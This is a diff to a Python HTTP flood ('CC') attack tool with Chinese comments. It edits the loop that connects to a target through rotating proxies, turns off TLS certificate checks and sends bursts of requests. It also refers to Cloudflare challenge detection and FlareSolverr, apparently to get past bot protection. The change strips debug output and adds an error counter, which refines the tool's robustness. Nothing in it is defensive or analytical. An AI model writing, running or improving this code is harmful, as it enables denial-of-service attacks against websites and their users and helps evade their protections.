@@ -515,8 +515,8 @@ def cc(event,proxy_type):
         add = "&"
     event.wait()
     
-    connection_attempts = 0
-    successful_requests = 0
+    error_count = 0
+    max_errors = 50  # 连续错误50次后打印一次警告
     
     while True:
         try:
@@ -531,13 +531,7 @@ def cc(event,proxy_type):
             if brute:
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             
-            s.settimeout(10)  # 增加超时时间
-            connection_attempts += 1
-            
-            # 添加连接调试信息
-            if connection_attempts <= 3:
-                print(f"[DEBUG] 尝试连接 {target}:{port} 通过代理 {proxy[0]}:{proxy[1]}")
-            
+            s.settimeout(10)
             s.connect((str(target), int(port)))
             
             if protocol == "https":
@@ -546,8 +540,8 @@ def cc(event,proxy_type):
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
             
-            if connection_attempts <= 3:
-                print(f"[DEBUG] 连接成功，开始发送请求")
+            # 连接成功，重置错误计数
+            error_count = 0
             
             try:
                 for i in range(100):
@@ -559,27 +553,22 @@ def cc(event,proxy_type):
                         proxy = Choice(proxies).strip().split(":")
                         break
                     
-                    successful_requests += 1
-                    if successful_requests <= 3:
-                        print(f"[DEBUG] 请求 {successful_requests} 发送成功")
-                    
                     new_header = handle_response_with_cf_detection(s, GenReqHeader, "get")
                     if new_header:
                         header = new_header
                         
                 s.close()
-            except Exception as e:
-                if connection_attempts <= 3:
-                    print(f"[DEBUG] 请求发送错误: {e}")
+            except:
                 s.close()
                 
-        except Exception as e:
-            if connection_attempts <= 3:
-                print(f"[DEBUG] 连接错误: {e}")
+        except:
             s.close()
-            proxy = Choice(proxies).strip().split(":")  # 切换代理
-
-
+            proxy = Choice(proxies).strip().split(":")
+            error_count += 1
+            
+            # 每50次连续错误打印一次警告
+            if error_count % max_errors == 0:
+                print(f"[WARNING] 线程连续失败 {error_count} 次，当前代理: {proxy[0]}:{proxy[1]}")
 
 def head(event,proxy_type):
 	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
